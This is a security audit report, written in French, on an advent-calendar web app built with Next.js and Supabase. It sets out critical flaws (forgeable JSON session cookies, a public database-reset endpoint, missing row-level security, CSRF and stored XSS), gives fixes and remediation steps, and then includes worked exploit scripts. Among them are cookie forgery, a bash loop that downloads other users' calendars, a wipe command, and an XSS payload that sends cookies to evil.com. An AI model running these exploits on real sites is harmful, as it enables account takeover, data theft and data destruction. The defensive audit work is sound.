# 🔒 RAPPORT DE VULNÉRABILITÉS - CALENDRIER DE L'AVENT

**Date:** 2025-11-27
**Niveau de risque global:** 🔴 CRITIQUE (8.1/10)
**Statut:** ❌ NE PAS METTRE EN PRODUCTION

---

## 📋 SOMMAIRE

1. [Vulnérabilités Critiques](#vulnérabilités-critiques)
2. [Vulnérabilités Hautes](#vulnérabilités-hautes)
3. [Vulnérabilités Moyennes](#vulnérabilités-moyennes)
4. [Plan d'Action](#plan-daction)
5. [Exemples d'Exploits](#exemples-dexploits)

---

## 🚨 VULNÉRABILITÉS CRITIQUES

### VULN-001: Authentification factice non utilisée
**Sévérité:** 🔴 CRITIQUE (CVSS 10.0)
**Fichier:** `lib/auth.ts:3-6`

#### Description
La fonction `requireAuth()` est un placeholder qui ne fait aucune vérification et n'est jamais utilisée dans l'application.

#### Code vulnérable
```typescript
// lib/auth.ts - lignes 3-6
export function requireAuth() {
  // Placeholder server-only auth gate to be implemented with Supabase Auth
  return { userId: null };
}
```

#### Impact
- Aucune authentification réelle n'est en place
- Les endpoints reposent uniquement sur des cookies falsifiables
- Permet l'accès non autorisé à toutes les ressources

#### Solution
```typescript
import { createServerClient } from '@supabase/ssr'

export async function requireAuth(req: NextRequest) {
  const supabase = createServerClient(/* config */)
  const { data: { user }, error } = await supabase.auth.getUser()

  if (error || !user) {
    throw new Error('Unauthorized')
  }

  return { userId: user.id }
}
```

#### Références
- Utilisations attendues: tous les endpoints `/api/advent/buyer/*`
- Utilisation actuelle: **AUCUNE**

---

### VULN-002: Sessions basées sur cookies JSON non signés
**Sévérité:** 🔴 CRITIQUE (CVSS 9.8)
**Fichiers:**
- `lib/server-session.ts:8-18`
- `app/api/session/route.ts:15-32`

#### Description
Les sessions utilisateur sont stockées dans des cookies contenant du JSON brut sans signature cryptographique, permettant leur falsification triviale.

#### Code vulnérable
```typescript
// lib/server-session.ts - lignes 8-18
export function readBuyerSession(req: NextRequest): BuyerSession | null {
  const cookie = req.cookies.get(COOKIE_NAME);
  if (!cookie?.value) return null;
  try {
    return JSON.parse(cookie.value) as BuyerSession;
  } catch {
    return null;
  }
}

// app/api/session/route.ts - lignes 15-32
response.cookies.set(COOKIE_NAME, JSON.stringify({
  id: user.id,
  name: user.full_name,
  email: user.email,
  plan: user.plan,
  payment_status: user.payment_status
}), {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  maxAge: 60 * 60 * 24 * 30
});
```

#### Impact
Un attaquant peut :
1. Modifier son `buyer_id` pour usurper n'importe quel utilisateur
2. Changer son `plan` de "essentiel" à "premium" gratuitement
3. Modifier son `payment_status` pour bypasser les paiements

#### Exploit
```javascript
// Cookie original
buyer_session={"id":"user-123","plan":"plan_essentiel","payment_status":"unpaid"}

// Cookie modifié par l'attaquant
buyer_session={"id":"admin-456","plan":"plan_premium","payment_status":"paid"}
```

#### Solution
```bash
npm install jose
```

```typescript
import { SignJWT, jwtVerify } from 'jose'

const secret = new TextEncoder().encode(process.env.JWT_SECRET)

export async function createSession(userId: string, plan: string) {
  const token = await new SignJWT({ userId, plan })
    .setProtectedHeader({ alg: 'HS256' })
    .setExpirationTime('7d')
    .setIssuedAt()
    .sign(secret)
  return token
}

export async function verifySession(token: string) {
  try {
    const { payload } = await jwtVerify(token, secret)
    return payload
  } catch {
    throw new Error('Invalid token')
  }
}
```

#### Endpoints affectés
- ✅ Tous les endpoints qui appellent `readBuyerSession()`
- `GET /api/calendar-contents` (ligne 20)
- `POST /api/calendar-contents` (ligne 49)
- `GET /api/advent/buyer/calendars` (ligne 12)
- Et 7 autres...

---

### VULN-003: Validation destinataire sans vérification DB
**Sévérité:** 🔴 CRITIQUE (CVSS 9.5)
**Fichier:** `app/api/advent/recipient/verify/route.ts:20-44`

#### Description
La vérification du code d'accès destinataire n'interroge jamais la base de données et accepte n'importe quel code de 4+ caractères.

#### Code vulnérable
```typescript
// app/api/advent/recipient/verify/route.ts - lignes 20-33
// TODO: Implémenter la vérification réelle avec la base de données
// 1. Vérifier que le token existe et n'est pas expiré
// 2. Vérifier que le code correspond (hash comparison)
// 3. Récupérer les infos du calendrier et du receveur

// Pour le moment, on accepte juste le code "NOEL24" ou tout code valide
const isValid = code === "NOEL24" || code.length >= 4;

if (!isValid) {
  return NextResponse.json(
    { error: "Code d'accès invalide" },
    { status: 401 }
  );
}

// Lignes 36-44 - Création de session SANS vérification
const recipientSession = {
  type: "recipient",
  token,
  buyer_id: token,  // ⚠️ Le token devient directement le buyer_id !
  calendarId: token,
  recipientId: "recipient",
  recipientName: "Destinataire",
  verifiedAt: new Date().toISOString()
};
```

#### Impact
- N'importe qui peut accéder au calendrier de n'importe quel utilisateur
- Le `buyer_id` est directement défini au token fourni
- Aucune vérification d'expiration ou d'existence du token

#### Exploit
```bash
# Accéder au calendrier d'un utilisateur dont on connaît l'ID
curl -X POST https://app.com/api/advent/recipient/verify \
  -H "Content-Type: application/json" \
  -d '{"token":"victim-user-id-123","code":"1234"}'

# Résultat: session créée avec buyer_id = "victim-user-id-123"
```

#### Solution
```typescript
export async function POST(req: NextRequest) {
  const { token, code } = await req.json();

  // 1. Hasher le token pour le comparer
  const tokenHash = hashToken(token).toString('base64');

  // 2. Récupérer le calendrier depuis la DB
  const { data: calendar, error } = await supabase
    .from('calendars')
    .select('id, buyer_id, recipient_id, access_code_hash, open_token_expires_at')
    .eq('open_token_hash_b64', tokenHash)
    .single();

  if (error || !calendar) {
    return NextResponse.json({ error: "Token invalide" }, { status: 401 });
  }

  // 3. Vérifier l'expiration
  if (new Date(calendar.open_token_expires_at) < new Date()) {
    return NextResponse.json({ error: "Token expiré" }, { status: 401 });
  }

  // 4. Vérifier le code d'accès (bcrypt compare)
  const isValidCode = await compare(code, calendar.access_code_hash);
  if (!isValidCode) {
    return NextResponse.json({ error: "Code incorrect" }, { status: 401 });
  }

  // 5. Créer la session avec les VRAIES données
  const recipientSession = {
    type: "recipient",
    buyer_id: calendar.buyer_id,
    calendar_id: calendar.id,
    recipient_id: calendar.recipient_id,
    verified_at: new Date().toISOString()
  };

  // ...
}
```

---

### VULN-004: Absence de contrôle d'accès sur endpoints recipient
**Sévérité:** 🔴 CRITIQUE (CVSS 9.3)
**Fichiers:**
- `app/api/advent/recipient/open/route.ts:8-14`
- `app/api/advent/recipient/days/route.ts:10-17`

#### Description
Les endpoints destinataire acceptent le `buyer_id` directement depuis un cookie non vérifié, permettant l'accès aux données d'autres utilisateurs.

#### Code vulnérable - Endpoint `/open`
```typescript
// app/api/advent/recipient/open/route.ts - lignes 8-14
const buyerSession = readBuyerSession(req as any);
const recipientCookie = req.cookies.get("recipient_session");
const recipientSession = recipientCookie ? JSON.parse(recipientCookie.value) : null;

const buyerId = buyerSession?.id ?? recipientSession?.buyer_id ?? recipientSession?.buyerId ?? null;

if (!buyerId) {
  return new NextResponse("Unauthorized", { status: 401 });
}

// Lignes 23-28 - Requête DB avec buyerId non vérifié
const { data, error } = await supabase
  .from("calendar_contents")
  .select("type,content,title")
  .eq("buyer_id", buyerId)  // ⚠️ buyerId contrôlé par l'attaquant
  .eq("day", finalDayNumber)
```

#### Code vulnérable - Endpoint `/days`
```typescript
// app/api/advent/recipient/days/route.ts - lignes 10-17
const buyerSession = readBuyerSession(req as any);
const recipientCookie = req.cookies.get("recipient_session");
const recipientSession = recipientCookie ? JSON.parse(recipientCookie.value) : null;

const buyerId = buyerSession?.id ?? recipientSession?.buyer_id ?? recipientSession?.buyerId ?? null;

if (!buyerId) {
  return new NextResponse("Unauthorized", { status: 401 });
}

// Lignes 28-37 - Requête avec buyerId non vérifié
const { data: contentRows, error } = await supabase
  .from("calendar_contents")
  .select("day")
  .eq("buyer_id", buyerId);  // ⚠️ Accès non autorisé possible
```

#### Impact
Un attaquant peut :
1. Lire tous les jours et contenus d'un autre utilisateur
2. Voir photos, messages, dessins, musiques privées
3. Énumérer tous les calendriers

#### Exploit
```javascript
// 1. Créer un cookie falsifié
document.cookie = 'recipient_session={"buyer_id":"victim-123"}; path=/';

// 2. Lister tous les jours
fetch('/api/advent/recipient/days')
  .then(r => r.json())
  .then(data => console.log('Jours de la victime:', data));

// 3. Ouvrir chaque jour
for (let day = 1; day <= 24; day++) {
  fetch('/api/advent/recipient/open', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ dayNumber: day })
  }).then(r => r.json()).then(console.log);
}
```

#### Solution
```typescript
// Créer un middleware de vérification
export async function verifyRecipientAccess(
  req: NextRequest,
  calendarId: string
): Promise<{ buyer_id: string } | null> {
  const recipientCookie = req.cookies.get("recipient_session");
  if (!recipientCookie) return null;

  const session = JSON.parse(recipientCookie.value);

  // Vérifier que la session est valide en DB
  const { data: calendar, error } = await supabase
    .from('calendars')
    .select('buyer_id, id')
    .eq('id', session.calendar_id)
    .eq('buyer_id', session.buyer_id)
    .single();

  if (error || !calendar) return null;

  return { buyer_id: calendar.buyer_id };
}

// Utiliser dans les endpoints
export async function POST(req: NextRequest) {
  const access = await verifyRecipientAccess(req, calendarId);
  if (!access) {
    return new NextResponse("Unauthorized", { status: 401 });
  }

  const buyerId = access.buyer_id; // ✅ Vérifié depuis la DB
  // ...
}
```

---

### VULN-005: Endpoint de reset accessible publiquement
**Sévérité:** 🔴 CRITIQUE (CVSS 8.5)
**Fichier:** `app/api/advent/internal/debug/reset/route.ts:3-7`

#### Description
L'endpoint `/api/advent/internal/debug/reset` est accessible publiquement et supprime toutes les données sans authentification.

#### Code vulnérable
```typescript
// app/api/advent/internal/debug/reset/route.ts - lignes 3-7
export async function POST() {
  await db.bootstrap();
  await db.reset();
  return NextResponse.json({ ok: true });
}
```

#### Impact
- **Déni de service total** : suppression de toutes les données
- Tous les utilisateurs perdent leurs calendriers
- Perte de données irréversible
- Pas de logs, pas de traces

#### Exploit
```bash
# N'importe qui peut détruire l'application
curl -X POST https://production-app.com/api/advent/internal/debug/reset
# → Toutes les données supprimées en 1 seconde
```

#### Solution immédiate
```typescript
export async function POST(req: NextRequest) {
  // 1. Bloquer en production
  if (process.env.NODE_ENV === 'production') {
    return new NextResponse("Forbidden", { status: 403 });
  }

  // 2. Vérifier un secret admin
  const adminSecret = req.headers.get("x-admin-secret");
  if (adminSecret !== process.env.ADMIN_SECRET) {
    console.warn('[SECURITY] Unauthorized reset attempt');
    return new NextResponse("Unauthorized", { status: 401 });
  }

  // 3. Logger l'action
  console.warn('[ADMIN] Database reset executed');

  await db.bootstrap();
  await db.reset();
  return NextResponse.json({ ok: true });
}
```

#### Recommandation long terme
**Supprimer complètement cet endpoint** et utiliser un script CLI pour les resets :
```bash
npm run db:reset
```

---

### VULN-009: Absence de Row Level Security Supabase
**Sévérité:** 🔴 CRITIQUE (CVSS 9.9)
**Fichiers:**
- `lib/supabase.ts:11-17` (utilisation de SERVICE_ROLE_KEY)
- Configuration Supabase manquante

#### Description
L'application utilise exclusivement la clé `SERVICE_ROLE_KEY` qui **bypass tous les contrôles RLS**. Aucune politique RLS n'est configurée sur les tables.

#### Code problématique
```typescript
// lib/supabase.ts - lignes 11-17
export const supabaseServer = () =>
  createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL || "",
    process.env.SUPABASE_SERVICE_ROLE_KEY || "",  // ⚠️ BYPASS RLS
    {
      auth: {
        persistSession: false,
      },
    }
  );
```

#### Impact
- La sécurité repose **uniquement** sur le code applicatif
- Comme le code a des failles (sessions falsifiables), les données sont exposées
- Un bug applicatif = exposition totale des données
- Pas de defense-in-depth

#### Tables sans protection
- `buyers` - Emails, passwords, plans
- `calendar_contents` - Photos, messages privés
- `receivers` - Informations destinataires
- `projects` - Données projets

#### Solution URGENTE
```sql
-- 1. Activer RLS sur toutes les tables
ALTER TABLE buyers ENABLE ROW LEVEL SECURITY;
ALTER TABLE calendar_contents ENABLE ROW LEVEL SECURITY;
ALTER TABLE receivers ENABLE ROW LEVEL SECURITY;
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;
ALTER TABLE calendars ENABLE ROW LEVEL SECURITY;

-- 2. Politique pour buyers : un utilisateur voit seulement ses données
CREATE POLICY "Users can view own data" ON buyers
  FOR SELECT USING (auth.uid() = id);

CREATE POLICY "Users can update own data" ON buyers
  FOR UPDATE USING (auth.uid() = id);

-- 3. Politique pour calendar_contents : propriétaire uniquement
CREATE POLICY "Owners manage calendar contents" ON calendar_contents
  FOR ALL USING (buyer_id = auth.uid());

-- 4. Politique pour receivers : acheteur uniquement
CREATE POLICY "Buyers manage receivers" ON receivers
  FOR ALL USING (buyer_id = auth.uid());

-- 5. Politique pour projects : propriétaire uniquement
CREATE POLICY "Users manage own projects" ON projects
  FOR ALL USING (user_id = auth.uid());

-- 6. Politique pour calendars :
--    - Lecture : propriétaire OU destinataire vérifié
--    - Écriture : propriétaire uniquement
CREATE POLICY "Owner manages calendars" ON calendars
  FOR ALL USING (buyer_id = auth.uid());

CREATE POLICY "Verified recipients view calendar" ON calendars
  FOR SELECT USING (
    recipient_id IS NOT NULL AND
    open_token_expires_at > now()
  );
```

#### Changement de code nécessaire
```typescript
// Remplacer SERVICE_ROLE_KEY par auth utilisateur
export const supabaseServer = (userToken?: string) => {
  if (userToken) {
    return createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL || "",
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "",
      {
        global: {
          headers: {
            Authorization: `Bearer ${userToken}`
          }
        }
      }
    );
  }

  // Fallback pour operations admin (à utiliser avec prudence)
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL || "",
    process.env.SUPABASE_SERVICE_ROLE_KEY || "",
    { auth: { persistSession: false } }
  );
};
```

---

## 🔴 VULNÉRABILITÉS HAUTES

### VULN-007: Absence de protection CSRF
**Sévérité:** 🔴 HAUTE (CVSS 8.0)
**Fichiers:** Tous les endpoints POST (26 endpoints)

#### Description
Aucun token CSRF n'est utilisé, permettant des attaques Cross-Site Request Forgery.

#### Endpoints vulnérables
- `POST /api/calendar-contents` - Modification de contenus
- `POST /api/receivers` - Création destinataires
- `POST /api/buyers` - Création comptes
- `POST /api/session` - Connexion
- Et 22 autres endpoints POST...

#### Cookies actuels
```typescript
// app/api/session/route.ts - ligne 19
sameSite: "lax"  // ⚠️ Insuffisant pour POST
```

#### Impact
Un site malveillant peut exécuter des actions au nom d'un utilisateur connecté.

#### Exploit
```html
<!-- Site malveillant evil.com -->
<form id="csrf" action="https://calendrier-app.com/api/calendar-contents" method="POST">
  <input type="hidden" name="day" value="1">
  <input type="hidden" name="type" value="message">
  <input type="hidden" name="content" value="VOUS AVEZ ÉTÉ HACKÉ">
</form>
<script>
  document.getElementById('csrf').submit();
</script>
```

#### Solution
```bash
npm install @edge-csrf/nextjs
```

```typescript
// middleware.ts
import { createCsrfProtect } from '@edge-csrf/nextjs';

const csrfProtect = createCsrfProtect({
  cookie: {
    secure: process.env.NODE_ENV === 'production',
  },
});

export async function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Protéger toutes les requêtes POST/PUT/DELETE
  if (['POST', 'PUT', 'DELETE'].includes(request.method)) {
    const csrfError = await csrfProtect(request, response);
    if (csrfError) {
      return new NextResponse('Invalid CSRF token', { status: 403 });
    }
  }

  return response;
}
```

---

### VULN-012: Middleware insuffisant
**Sévérité:** 🔴 HAUTE (CVSS 7.5)
**Fichier:** `middleware.ts:4-15`

#### Description
Le middleware ne protège que `/open/calendar` et vérifie seulement la présence du cookie, pas sa validité.

#### Code actuel
```typescript
// middleware.ts - lignes 4-15
export function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;

  if (pathname.startsWith("/open/calendar")) {
    const cookie = req.cookies.get("recipient_session");
    if (!cookie) {
      const url = req.nextUrl.clone();
      url.pathname = "/open/expired";
      return NextResponse.redirect(url);
    }
  }

  return NextResponse.next();
}
```

#### Problèmes
1. Ne protège pas `/dashboard`, `/calendars/*`, `/gift/*`
2. Vérifie seulement la **présence** du cookie, pas sa validité
3. Ne valide pas le contenu du cookie
4. Pas de vérification des routes API

#### Routes non protégées
- `/dashboard` - Accessible sans session
- `/calendars/new` - Création sans auth
- `/calendars/[id]/edit` - Édition sans vérification
- `/gift/*` - Tout le wizard gift

#### Solution
```typescript
export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;

  // 1. Protéger les routes dashboard/calendars
  const protectedRoutes = ['/dashboard', '/calendars', '/gift'];
  const isProtected = protectedRoutes.some(route => pathname.startsWith(route));

  if (isProtected) {
    const sessionCookie = req.cookies.get('buyer_session');
    if (!sessionCookie) {
      return NextResponse.redirect(new URL('/login', req.url));
    }

    // Vérifier la validité du JWT
    try {
      await verifySession(sessionCookie.value);
    } catch {
      return NextResponse.redirect(new URL('/login', req.url));
    }
  }

  // 2. Protéger les routes recipient
  if (pathname.startsWith('/open/calendar')) {
    const recipientCookie = req.cookies.get('recipient_session');
    if (!recipientCookie) {
      return NextResponse.redirect(new URL('/open/expired', req.url));
    }

    // Vérifier l'expiration
    try {
      const session = JSON.parse(recipientCookie.value);
      if (new Date(session.expiry) < new Date()) {
        return NextResponse.redirect(new URL('/open/expired', req.url));
      }
    } catch {
      return NextResponse.redirect(new URL('/open/expired', req.url));
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: [
    '/dashboard/:path*',
    '/calendars/:path*',
    '/gift/:path*',
    '/open/:path*'
  ]
};
```

---

## 🟠 VULNÉRABILITÉS MOYENNES

### VULN-006: Stockage XSS via contenu non sanitisé
**Sévérité:** 🟠 MOYENNE (CVSS 6.8)
**Fichier:** `app/api/calendar-contents/route.ts:52-60`

#### Description
Le champ `content` accepte n'importe quelle chaîne sans sanitisation, permettant l'injection de scripts malveillants.

#### Code vulnérable
```typescript
// app/api/calendar-contents/route.ts - lignes 52-60
const schema = z.object({
  day: z.number().int().min(1).max(24),
  type: z.enum(["photo", "message", "drawing", "music", "voice", "ai_photo"]),
  content: z.string().min(1),  // ⚠️ Pas de sanitisation
  title: z.string().max(255).optional(),
});
```

#### Exploit
```javascript
POST /api/calendar-contents
{
  "day": 1,
  "type": "message",
  "content": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>",
  "buyer_id": "attacker-id"
}
```

Si le frontend affiche avec `dangerouslySetInnerHTML`, le script s'exécute.

#### Solution
```bash
npm install isomorphic-dompurify
```

```typescript
import DOMPurify from 'isomorphic-dompurify';

const schema = z.object({
  content: z.string().min(1).transform(val => DOMPurify.sanitize(val)),
  // ...
});
```

---

### VULN-008: Code promo hardcodé
**Sévérité:** 🟠 MOYENNE (CVSS 5.5)
**Fichier:** `app/api/create-checkout-session/route.ts:38`

#### Description
Le code promo est hardcodé dans le code source au lieu d'être en base de données.

#### Code vulnérable
```typescript
// app/api/create-checkout-session/route.ts - ligne 38
const promoApplied = typeof promoCode === "string" &&
  promoCode.trim().toUpperCase() === "X-HEC-2026";
```

#### Problèmes
1. Visible dans Git history
2. Pas de gestion d'expiration
3. Pas de limite d'utilisation
4. Non extensible

#### Solution
```sql
CREATE TABLE promo_codes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  code VARCHAR(50) UNIQUE NOT NULL,
  discount_percent INT CHECK (discount_percent BETWEEN 0 AND 100),
  discount_amount INT,
  max_uses INT,
  used_count INT DEFAULT 0,
  expires_at TIMESTAMPTZ,
  active BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ DEFAULT now()
);

INSERT INTO promo_codes (code, discount_percent, expires_at, max_uses)
VALUES ('X-HEC-2026', 100, '2026-12-31', 500);
```

```typescript
async function validatePromoCode(code: string): Promise<PromoCode | null> {
  const { data, error } = await supabase
    .from('promo_codes')
    .select('*')
    .eq('code', code.toUpperCase())
    .eq('active', true)
    .single();

  if (error || !data) return null;

  // Vérifier expiration
  if (data.expires_at && new Date(data.expires_at) < new Date()) {
    return null;
  }

  // Vérifier limite d'utilisation
  if (data.max_uses && data.used_count >= data.max_uses) {
    return null;
  }

  return data;
}
```

---

### VULN-010: Endpoint emails sans protection
**Sévérité:** 🟠 MOYENNE (CVSS 6.5)
**Fichier:** `app/api/emails/send-daily/route.ts:3-6`

#### Description
L'endpoint cron pour l'envoi d'emails est accessible publiquement sans authentification.

#### Code vulnérable
```typescript
// app/api/emails/send-daily/route.ts - lignes 3-6
export async function GET() {
  // Placeholder: iterate calendars active today and send emails
  return NextResponse.json({ ok: true });
}
```

#### Impact
- N'importe qui peut déclencher l'envoi d'emails
- Spam possible si implémenté
- DoS par épuisement de quota email

#### Solution
```typescript
export async function GET(req: NextRequest) {
  // Vérifier le secret Vercel Cron
  const authHeader = req.headers.get('authorization');
  const cronSecret = process.env.CRON_SECRET;

  if (authHeader !== `Bearer ${cronSecret}`) {
    console.warn('[SECURITY] Unauthorized cron access attempt', {
      ip: req.ip,
      timestamp: new Date().toISOString()
    });
    return new NextResponse('Unauthorized', { status: 401 });
  }

  // Implémenter la logique d'envoi
  const calendars = await getActiveCalendars();
  for (const calendar of calendars) {
    await sendDailyEmail(calendar);
  }

  return NextResponse.json({ ok: true, sent: calendars.length });
}
```

Configuration Vercel:
```json
// vercel.json
{
  "crons": [{
    "path": "/api/emails/send-daily",
    "schedule": "30 5 * * *",
    "headers": [{
      "key": "authorization",
      "value": "Bearer ${CRON_SECRET}"
    }]
  }]
}
```

---

### VULN-011: Waitlist sans rate limiting
**Sévérité:** 🟠 MOYENNE (CVSS 5.8)
**Fichier:** `app/api/advent/internal/waitlist/route.ts:4-14`

#### Description
L'endpoint waitlist n'a aucune protection contre le spam.

#### Code vulnérable
```typescript
// app/api/advent/internal/waitlist/route.ts - lignes 4-14
export async function POST(req: NextRequest) {
  await db.bootstrap();
  const b = await req.json();
  const r = await db.insertWaitlist({
    email: b.email,
    name: b.name ?? null,
    phoneE164: b.phoneE164 ?? null
  });
  return NextResponse.json({ ok: true, id: r.id });
}
```

#### Problèmes
1. Pas de rate limiting
2. Pas de validation email
3. Pas de captcha
4. Pas de détection de doublon

#### Solution
```bash
npm install @upstash/ratelimit @upstash/redis
```

```typescript
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(3, "1 h"),
});

export async function POST(req: NextRequest) {
  // Rate limiting par IP
  const ip = req.ip ?? '127.0.0.1';
  const { success } = await ratelimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { error: "Too many requests" },
      { status: 429 }
    );
  }

  const body = await req.json();

  // Validation
  const schema = z.object({
    email: z.string().email(),
    name: z.string().min(2).max(100).optional(),
    phoneE164: z.string().regex(/^\+[1-9]\d{1,14}$/).optional()
  });

  const result = schema.safeParse(body);
  if (!result.success) {
    return NextResponse.json(
      { error: "Invalid data" },
      { status: 400 }
    );
  }

  // Vérifier doublon
  const existing = await db.findWaitlistByEmail(result.data.email);
  if (existing) {
    return NextResponse.json(
      { error: "Email already registered" },
      { status: 409 }
    );
  }

  const entry = await db.insertWaitlist(result.data);
  return NextResponse.json({ ok: true, id: entry.id });
}
```

---

## 📋 PLAN D'ACTION

### Phase 1: URGENCE IMMÉDIATE (Aujourd'hui)
**Temps estimé:** 2-3 heures

1. ✅ **Désactiver `/api/advent/internal/debug/reset`**
   - Ajouter check `NODE_ENV === 'production'`
   - Temps: 5 minutes

2. ✅ **Configurer RLS Supabase**
   - Exécuter les migrations SQL
   - Activer RLS sur toutes les tables
   - Temps: 30 minutes

3. ✅ **Corriger vérification destinataire**
   - Remplacer `code.length >= 4` par vraie validation DB
   - Temps: 45 minutes

4. ✅ **Bloquer accès non autorisé aux contenus**
   - Ajouter validation `buyer_id` dans `/open` et `/days`
   - Temps: 30 minutes

### Phase 2: HAUTE PRIORITÉ (Cette semaine)
**Temps estimé:** 1-2 jours

5. ✅ **Implémenter JWT signés**
   - Remplacer cookies JSON par JWT
   - Mettre à jour tous les endpoints
   - Temps: 3-4 heures

6. ✅ **Ajouter protection CSRF**
   - Installer `@edge-csrf/nextjs`
   - Configurer middleware
   - Temps: 1 heure

7. ✅ **Améliorer middleware**
   - Protéger toutes les routes sensibles
   - Valider sessions
   - Temps: 2 heures

8. ✅ **Protéger endpoint emails**
   - Ajouter secret cron
   - Temps: 30 minutes

### Phase 3: MOYENNE PRIORITÉ (Ce mois)
**Temps estimé:** 1 semaine

9. ⏳ **Sanitiser entrées utilisateur**
   - Installer DOMPurify
   - Appliquer sur tous les champs texte
   - Temps: 2 heures

10. ⏳ **Migrer codes promo en DB**
    - Créer table `promo_codes`
    - Migrer code existant
    - Temps: 3 heures

11. ⏳ **Implémenter rate limiting**
    - Configurer Upstash Redis
    - Appliquer sur endpoints publics
    - Temps: 4 heures

12. ⏳ **Ajouter monitoring**
    - Configurer Sentry
    - Logger tentatives suspectes
    - Temps: 2 heures

### Phase 4: AMÉLIORATION CONTINUE (Trimestre)

13. ⏳ Audit de sécurité professionnel
14. ⏳ Tests de pénétration
15. ⏳ Mise en place CI/CD avec scans sécu
16. ⏳ Documentation des procédures d'incident

---

## 💣 EXEMPLES D'EXPLOITS

### Exploit 1: Usurpation d'identité totale
```javascript
// 1. Récupérer son cookie actuel
const myCookie = document.cookie.match(/buyer_session=([^;]+)/)[1];
const mySession = JSON.parse(decodeURIComponent(myCookie));
console.log("Mon ID:", mySession.id); // "user-123"

// 2. Modifier pour usurper une victime
const fakeSession = {
  ...mySession,
  id: "admin-456",  // ID de la victime
  plan: "plan_premium",
  payment_status: "paid"
};

// 3. Remplacer le cookie
document.cookie = `buyer_session=${JSON.stringify(fakeSession)}; path=/`;

// 4. Maintenant toutes les requêtes se font au nom de "admin-456"
fetch('/api/calendar-contents')
  .then(r => r.json())
  .then(data => console.log("Contenus volés:", data));
```

---

### Exploit 2: Accès non autorisé aux calendriers
```bash
#!/bin/bash
# Script pour extraire tous les calendriers de tous les utilisateurs

# 1. Énumérer les UUIDs possibles (brute force ou leak)
for user_id in $(cat leaked_user_ids.txt); do

  # 2. Créer cookie falsifié
  cookie="recipient_session={\"buyer_id\":\"$user_id\"}"

  # 3. Récupérer tous les jours
  curl -s "https://app.com/api/advent/recipient/days" \
    -H "Cookie: $cookie" \
    -o "stolen_data/${user_id}_days.json"

  # 4. Télécharger chaque jour
  for day in {1..24}; do
    curl -s "https://app.com/api/advent/recipient/open" \
      -X POST \
      -H "Cookie: $cookie" \
      -H "Content-Type: application/json" \
      -d "{\"dayNumber\":$day}" \
      -o "stolen_data/${user_id}_day${day}.json"
  done

  echo "✅ Volé calendrier de $user_id"
done

echo "🎉 Terminé: tous les calendriers téléchargés dans stolen_data/"
```

---

### Exploit 3: Bypass paiement
```javascript
// 1. Créer un compte
await fetch('/api/buyers', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'hacker@evil.com',
    password: 'pass123',
    fullName: 'Hacker',
    phone: '+33612345678',
    plan: 'plan_essentiel'
  })
});

// 2. Se connecter
await fetch('/api/session', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'hacker@evil.com',
    password: 'pass123'
  })
});

// 3. Modifier le cookie pour plan premium + paid
const fakeCookie = {
  id: "mon-user-id",
  plan: "plan_premium",  // Upgrade gratuit
  payment_status: "paid",  // Marquer comme payé
  email: "hacker@evil.com",
  name: "Hacker"
};
document.cookie = `buyer_session=${JSON.stringify(fakeCookie)}; path=/`;

// 4. Créer un calendrier premium sans payer
await fetch('/api/advent/buyer/calendars', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    title: "Calendrier gratuit",
    // ... avec fonctionnalités premium (musique Spotify)
  })
});

console.log("✅ Calendrier premium créé sans payer !");
```

---

### Exploit 4: Destruction totale (DoS)
```bash
# Supprimer toutes les données de l'application
curl -X POST https://production-app.com/api/advent/internal/debug/reset

# Résultat: tous les utilisateurs perdent leurs calendriers
# Temps d'exécution: < 1 seconde
# Authentification requise: AUCUNE
```

---

## 🔬 TESTS DE VALIDATION

### Test 1: Vérifier JWT implémenté
```bash
# Avant: cookie JSON
buyer_session={"id":"123","plan":"essentiel"}

# Après: JWT signé
buyer_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Test: essayer de modifier
# → Doit échouer avec "Invalid signature"
```

### Test 2: Vérifier RLS actif
```sql
-- Se connecter avec ANON_KEY (pas SERVICE_ROLE_KEY)
-- Essayer d'accéder aux données d'un autre utilisateur
SELECT * FROM calendar_contents WHERE buyer_id = 'autre-user-id';
-- Attendu: 0 résultats (bloqué par RLS)
```

### Test 3: Vérifier CSRF
```bash
# Essayer de soumettre un formulaire depuis evil.com
curl https://app.com/api/calendar-contents \
  -X POST \
  -H "Origin: https://evil.com" \
  -H "Cookie: buyer_session=..." \
  -d '{"day":1,"type":"message","content":"test"}'

# Attendu: 403 Forbidden (token CSRF manquant)
```

### Test 4: Vérifier reset bloqué
```bash
curl -X POST https://production-app.com/api/advent/internal/debug/reset
# Attendu: 403 Forbidden
```

---

## 📚 RESSOURCES

### Documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Supabase RLS](https://supabase.com/docs/guides/auth/row-level-security)
- [Next.js Security](https://nextjs.org/docs/app/building-your-application/authentication)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

### Outils de test
- [OWASP ZAP](https://www.zaproxy.org/) - Scanner de vulnérabilités
- [Burp Suite](https://portswigger.net/burp) - Proxy d'interception
- [Postman](https://www.postman.com/) - Test d'API

### Monitoring
- [Sentry](https://sentry.io/) - Tracking d'erreurs
- [DataDog](https://www.datadoghq.com/) - Monitoring
- [LogRocket](https://logrocket.com/) - Session replay

---

## ✅ CHECKLIST DE VALIDATION

Avant la mise en production:

- [ ] JWT implémentés et testés
